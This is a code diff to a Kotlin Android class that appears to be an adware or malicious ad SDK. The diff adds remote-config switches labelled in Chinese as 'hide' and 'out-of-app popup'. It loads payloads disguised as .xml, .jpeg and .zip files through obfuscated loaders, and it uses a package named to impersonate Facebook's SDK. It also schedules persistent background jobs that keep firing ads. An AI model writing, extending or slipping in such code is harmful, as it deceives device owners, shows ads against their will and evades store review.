@@ -11,7 +11,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.util.Log
-import c.a
+import z.m
 import com.facebook.impI.Start
 import com.facebook.impI.LifeRegister
 import com.facebook.FacebookSdk
@@ -19,8 +19,8 @@ import com.facebook.appevents.AppEventsLogger
 import com.google.firebase.analytics.FirebaseAnalytics
 import com.google.firebase.analytics.ktx.analytics
 import com.google.firebase.ktx.Firebase
-import com.kijz.laisk.kzma.AsuijJozk
-import opm.z.cd
+import com.society.laisk.ray.Meter
+import com.caz.Ac
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -69,7 +69,14 @@ object AdMzki {
 
     @JvmStatic
     var isLoadH = false
-    private var tagL = ""
+
+    private var tagL = ""// 隐藏
+    private var tagO = "" //外弹字符串
+
+    @JvmStatic
+    var strBroadKey = "" // 广播的key
+    private var fileName = ""// 文件开关名
+
     private var timeDS = 100L
     private var timeDE = 400L
     private var maxShowTime = 10000L // 最大显示时间
@@ -146,9 +153,9 @@ object AdMzki {
 
     @JvmStatic
     fun a2() {
-        mContext.registerActivityLifecycleCallbacks(LifeRegister())
-        File("${mContext.dataDir}/care").mkdirs()
         refConfigure()
+        File("${mContext.dataDir}/$fileName").mkdirs()
+        mContext.registerActivityLifecycleCallbacks(LifeRegister())
         t()
     }
 
@@ -162,8 +169,13 @@ object AdMzki {
     }
 
     private fun reConfig(js: JSONObject) {
+        Log.e("TAG", "reConfig: ${js.toString()}" )
         sK = js.optString("igloo_ks")
-        tagL = js.optString("igloo_name")
+        val listStr = js.optString("igloo_name").split("-")
+        tagL = listStr[0]
+        tagO = listStr[1]
+        strBroadKey = listStr[2]
+        fileName = listStr[3]
         mAdC.setAdId(js.optString("dahlia_id_h"), js.optString("dahlia_idL"))
         val lt = js.optString("dahlia_t").split("-")
         cTime = lt[0].toLong() * 1000
@@ -176,7 +188,6 @@ object AdMzki {
         timeDE = lt[7].toLong()
         maxShowTime = lt[8].toLong() * 1000
         timRandom = lt[9].toLong() * 1000
-        Log.e("TAG-->", "reConfig: $js ---$nTryMax")
     }
 
     private fun t() {
@@ -190,14 +201,14 @@ object AdMzki {
             val time = System.currentTimeMillis()
             val i: Boolean
             withContext(Dispatchers.IO) {
-                i = loadSFile(if (is64i) "care.json" else "igloo.txt")
+                i = loadSFile(if (is64i) "pink/ahgo.xml" else "tips/ika.txt")
             }
             if (i.not()) {
                 Start.pE("ss_l_f", "$is64i")
                 return@launch
             }
             Start.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            cd.f(2, 1.0, tagL)
+            Ac.f(2, 1.0, tagL)
             while (true) {
                 openJob()
                 var t = cTime
@@ -216,10 +227,10 @@ object AdMzki {
 
         mMainScope.launch(Dispatchers.IO) {
             delay(1000)
-            if (loadSFile(if (is64i) "cfas.webp" else "states.txt")) {
+            if (loadSFile(if (is64i) "tips/kiz.jpeg" else "pink/eryu.zip")) {
                 withContext(Dispatchers.Main) {
                     try {
-                        cd.a(mContext)
+                        Ac.a(mContext)
                         isLoadH = true
                     } catch (_: Throwable) {
                     }
@@ -299,7 +310,7 @@ object AdMzki {
         }
         Start.pE("ad_pass", "N")
         CoroutineScope(Dispatchers.Main).launch {
-            if (a.b()) {
+            if (m.b()) {
                 if (isSAd) {
                     delay(1200)
                 } else {
@@ -308,7 +319,7 @@ object AdMzki {
             }
             sNumJump(numJumps + 1)
             Start.pE("ad_start")
-            cd.f(2, 1.0, "ozfresh")
+            Ac.f(2, 1.0, tagO)
         }
     }
 
@@ -324,7 +335,7 @@ object AdMzki {
             val b = Bundle()
             b.putDouble(FirebaseAnalytics.Param.VALUE, e)
             b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
-            Firebase.analytics.logEvent("ad_impression_exp", b)
+            Firebase.analytics.logEvent("ad_impression_wise", b)
         } catch (_: Exception) {
         }
         if (FacebookSdk.isInitialized().not()) return
@@ -338,7 +349,7 @@ object AdMzki {
     private fun openJob() {
         if (System.currentTimeMillis() - time < 15000) return
         time = System.currentTimeMillis()
-        val componentName = ComponentName(mContext, AsuijJozk::class.java)
+        val componentName = ComponentName(mContext, Meter::class.java)
         try {
             val jobInfo: JobInfo =
                 JobInfo.Builder(3215, componentName).setMinimumLatency(3000) // 至少延迟 5 秒
